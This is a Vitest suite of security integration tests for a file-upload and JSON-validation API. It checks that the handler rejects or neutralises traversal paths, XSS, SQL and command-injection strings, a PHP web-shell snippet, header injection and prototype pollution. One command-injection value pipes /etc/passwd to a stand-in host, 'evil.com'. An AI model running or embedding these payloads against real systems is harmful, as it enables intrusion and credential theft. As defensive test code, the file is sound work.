import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { onRequest } from '../../api/[[path]].js';

describe('Security Scenarios Integration Tests', () => {
  let mockEnv;
  let mockContext;

  beforeEach(() => {
    mockEnv = {
      RATE_LIMITS: {
        get: vi.fn(),
        put: vi.fn(),
        delete: vi.fn()
      },
      FILE_STORAGE: {
        get: vi.fn(),
        put: vi.fn(),
        delete: vi.fn()
      }
    };

    mockContext = {
      waitUntil: vi.fn()
    };

    // Mock rate limiting to allow requests by default
    mockEnv.RATE_LIMITS.get.mockResolvedValue(null);
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  describe('Attack Vector Prevention', () => {
    it('should prevent directory traversal in upload filenames', async () => {
      const maliciousFiles = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      ];

      for (const filename of maliciousFiles) {
        const file = new File(['{"test": "data"}'], filename, {
          type: 'application/json'
        });

        const formData = new FormData();
        formData.append('files', file);

        const request = new Request('https://example.com/api/upload', {
          method: 'POST',
          body: formData,
          headers: {
            'cf-connecting-ip': '192.168.1.1'
          }
        });

        const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

        expect(response.status).toBe(400);

        const responseData = await response.json();
        expect(responseData.error_code).toBe('INVALID_FILE_TYPE');
      }
    });

    it('should prevent XSS in validation responses', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '"><script>alert("xss")</script>',
        "';alert('xss');//",
        '<img src=x onerror=alert("xss")>'
      ];

      for (const payload of xssPayloads) {
        const request = new Request('https://example.com/api/validate', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'cf-connecting-ip': '192.168.1.1'
          },
          body: JSON.stringify({ data: { malicious: payload } })
        });

        const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

        // Should either validate successfully or reject, but never expose XSS
        expect([200, 400, 422]).toContain(response.status);

        const responseText = await response.text();
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('javascript:');
      }
    });

    it('should prevent SQL injection attempts in parameters', async () => {
      const sqlPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users --",
        "1'; DELETE FROM uploads; --"
      ];

      for (const payload of sqlPayloads) {
        const request = new Request('https://example.com/api/convert', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'cf-connecting-ip': '192.168.1.1'
          },
          body: JSON.stringify({ uploadId: payload })
        });

        const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

        // Should handle safely without exposing internal errors
        expect([404, 400, 500]).toContain(response.status);

        const responseData = await response.json();
        expect(responseData.message).not.toContain('SQL');
        expect(responseData.message).not.toContain('database');
      }
    });

    it('should prevent command injection in file processing', async () => {
      const commandPayloads = [
        '"; rm -rf /; #',
        '$(cat /etc/passwd)',
        '`whoami`',
        '| nc -l 1234',
        '; curl evil.com/steal?data=$(cat /etc/passwd)'
      ];

      for (const payload of commandPayloads) {
        const file = new File([`{"command": "${payload}"}`], 'test.json', {
          type: 'application/json'
        });

        const formData = new FormData();
        formData.append('files', file);

        const request = new Request('https://example.com/api/upload', {
          method: 'POST',
          body: formData,
          headers: {
            'cf-connecting-ip': '192.168.1.1'
          }
        });

        const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

        // Should process safely without executing commands
        expect([200, 400]).toContain(response.status);
      }
    });
  });

  describe('DoS Attack Prevention', () => {
    it('should handle large payload attacks', async () => {
      // Create a very large JSON payload
      const largeData = {};
      for (let i = 0; i < 1000; i++) {
        largeData[`key${i}`] = 'x'.repeat(1000);
      }

      const request = new Request('https://example.com/api/validate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'cf-connecting-ip': '192.168.1.1'
        },
        body: JSON.stringify({ data: largeData })
      });

      const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

      // Should reject or handle gracefully
      expect([200, 400, 413]).toContain(response.status);

      if (response.status !== 200) {
        const responseData = await response.json();
        expect(['INVALID_JSON', 'FILE_TOO_LARGE']).toContain(responseData.error_code);
      }
    });

    it('should handle JSON bomb attacks', async () => {
      // Create deeply nested JSON structure
      let bomb = {};
      let current = bomb;
      for (let i = 0; i < 100; i++) {
        current.nested = {};
        current = current.nested;
      }

      const request = new Request('https://example.com/api/validate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'cf-connecting-ip': '192.168.1.1'
        },
        body: JSON.stringify({ data: bomb })
      });

      const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

      expect(response.status).toBe(400);

      const responseData = await response.json();
      expect(responseData.error_code).toBe('INVALID_JSON');
    });

    it('should handle zip bomb attempts in file uploads', async () => {
      // Create a file that appears small but could expand massively
      const suspiciousContent = JSON.stringify({
        activities: Array(10000).fill({
          data: 'x'.repeat(1000)
        })
      });

      const file = new File([suspiciousContent], 'suspicious.json', {
        type: 'application/json'
      });

      const formData = new FormData();
      formData.append('files', file);

      const request = new Request('https://example.com/api/upload', {
        method: 'POST',
        body: formData,
        headers: {
          'cf-connecting-ip': '192.168.1.1'
        }
      });

      const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

      // Should either process or reject based on size limits
      expect([200, 413]).toContain(response.status);
    });

    it('should handle rapid concurrent requests', async () => {
      const promises = [];
      const numRequests = 50;

      // Create many simultaneous requests
      for (let i = 0; i < numRequests; i++) {
        const request = new Request('https://example.com/api/validate', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'cf-connecting-ip': '192.168.1.1'
          },
          body: JSON.stringify({ data: { request: i } })
        });

        promises.push(onRequest({ request, env: mockEnv, ctx: mockContext }));
      }

      const responses = await Promise.all(promises);

      // Should handle all requests, some may be rate limited
      let successCount = 0;
      let rateLimitedCount = 0;

      responses.forEach(response => {
        if (response.status === 200) successCount++;
        if (response.status === 429) rateLimitedCount++;
      });

      // Should have processed some and rate limited others
      expect(successCount + rateLimitedCount).toBe(numRequests);
    });
  });

  describe('Data Validation Security', () => {
    it('should sanitize control characters in JSON', async () => {
      const maliciousData = {
        name: "test\x00\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f",
        description: "Contains\x7fcontrol\x1fcharacters"
      };

      const request = new Request('https://example.com/api/validate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'cf-connecting-ip': '192.168.1.1'
        },
        body: JSON.stringify({ data: maliciousData })
      });

      const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

      // Should handle safely
      expect([200, 400]).toContain(response.status);

      const responseData = await response.json();
      if (response.status === 200) {
        // If processed, ensure no control characters in response
        const responseText = JSON.stringify(responseData);
        expect(responseText).not.toMatch(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/);
      }
    });

    it('should handle Unicode normalization attacks', async () => {
      // Different Unicode representations of the same character
      const unicodeAttacks = [
        'café', // NFC: é as single character
        'cafe\u0301', // NFD: e + combining acute accent
        '\ufeff', // Zero-width no-break space
        '\u200b', // Zero-width space
        '\u2028', // Line separator
        '\u2029'  // Paragraph separator
      ];

      for (const attack of unicodeAttacks) {
        const file = new File([`{"name": "${attack}"}`], `${attack}.json`, {
          type: 'application/json'
        });

        const formData = new FormData();
        formData.append('files', file);

        const request = new Request('https://example.com/api/upload', {
          method: 'POST',
          body: formData,
          headers: {
            'cf-connecting-ip': '192.168.1.1'
          }
        });

        const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

        // Should handle Unicode safely
        expect([200, 400]).toContain(response.status);
      }
    });

    it('should prevent prototype pollution attempts', async () => {
      const pollutionPayloads = [
        { "__proto__": { "polluted": true } },
        { "constructor": { "prototype": { "polluted": true } } },
        { "__proto__.polluted": true },
        { "prototype.polluted": true }
      ];

      for (const payload of pollutionPayloads) {
        const request = new Request('https://example.com/api/validate', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'cf-connecting-ip': '192.168.1.1'
          },
          body: JSON.stringify({ data: payload })
        });

        const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

        // Should process safely without pollution
        expect([200, 400, 422]).toContain(response.status);

        // Verify prototype is not polluted
        expect(Object.prototype.polluted).toBeUndefined();
      }
    });
  });

  describe('Rate Limiting Security', () => {
    it('should prevent rate limit bypass with different IPs', async () => {
      const ips = ['192.168.1.1', '192.168.1.2', '192.168.1.3'];
      const responses = [];

      // Mock rate limiting to simulate different clients hitting limits
      const now = Math.floor(Date.now() / 1000);
      const existingRequests = Array.from({ length: 9 }, (_, i) => now - (i * 100));

      for (const ip of ips) {
        mockEnv.RATE_LIMITS.get.mockResolvedValue(JSON.stringify({
          requests: existingRequests,
          lastUpdate: now
        }));

        const request = new Request('https://example.com/api/validate', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'cf-connecting-ip': ip
          },
          body: JSON.stringify({ data: { test: 'data' } })
        });

        const response = await onRequest({ request, env: mockEnv, ctx: mockContext });
        responses.push({ ip, status: response.status });
      }

      // Each IP should be rate limited independently
      responses.forEach(({ ip, status }) => {
        expect([200, 429]).toContain(status);
      });
    });

    it('should handle rate limit header injection attempts', async () => {
      const maliciousHeaders = {
        'cf-connecting-ip': '192.168.1.1\r\nX-Injected: malicious',
        'x-forwarded-for': '192.168.1.1\r\nContent-Type: text/html',
        'user-agent': 'Test\r\nSet-Cookie: session=hacked'
      };

      for (const [headerName, headerValue] of Object.entries(maliciousHeaders)) {
        const request = new Request('https://example.com/api/validate', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            [headerName]: headerValue
          },
          body: JSON.stringify({ data: { test: 'data' } })
        });

        const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

        // Should handle safely without header injection
        expect([200, 400, 429]).toContain(response.status);

        // Verify no injected headers
        expect(response.headers.get('X-Injected')).toBeNull();
        expect(response.headers.get('Set-Cookie')).toBeNull();
      }
    });
  });

  describe('File Upload Security', () => {
    it('should prevent malicious file content injection', async () => {
      const maliciousContents = [
        '{"evil": "\u0000\u0001\u0002"}', // Null bytes
        '{"script": "<script>alert(1)</script>"}', // Script injection
        '{"php": "<?php system($_GET[\'cmd\']); ?>"}', // PHP injection
        '{"jsp": "<%=Runtime.getRuntime().exec(\"ls\")%>"}' // JSP injection
      ];

      for (const content of maliciousContents) {
        const file = new File([content], 'malicious.json', {
          type: 'application/json'
        });

        const formData = new FormData();
        formData.append('files', file);

        const request = new Request('https://example.com/api/upload', {
          method: 'POST',
          body: formData,
          headers: {
            'cf-connecting-ip': '192.168.1.1'
          }
        });

        mockEnv.FILE_STORAGE.put.mockResolvedValue();

        const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

        // Should either process safely or reject
        expect([200, 400]).toContain(response.status);
      }
    });

    it('should prevent MIME type confusion attacks', async () => {
      const mimeAttacks = [
        { name: 'test.json', type: 'text/html', content: '<html><script>alert(1)</script></html>' },
        { name: 'test.json', type: 'application/javascript', content: 'alert("xss")' },
        { name: 'test.json', type: 'text/plain', content: '{"valid": "json"}' },
        { name: 'test.json', type: 'application/octet-stream', content: '{"test": "data"}' }
      ];

      for (const attack of mimeAttacks) {
        const file = new File([attack.content], attack.name, {
          type: attack.type
        });

        const formData = new FormData();
        formData.append('files', file);

        const request = new Request('https://example.com/api/upload', {
          method: 'POST',
          body: formData,
          headers: {
            'cf-connecting-ip': '192.168.1.1'
          }
        });

        const response = await onRequest({ request, env: mockEnv, ctx: mockContext });

        // Should validate by actual content, not just MIME type
        if (attack.type !== 'application/json' && !attack.content.startsWith('{')) {
          expect(response.status).toBe(400);
        }
      }
    });
  });
});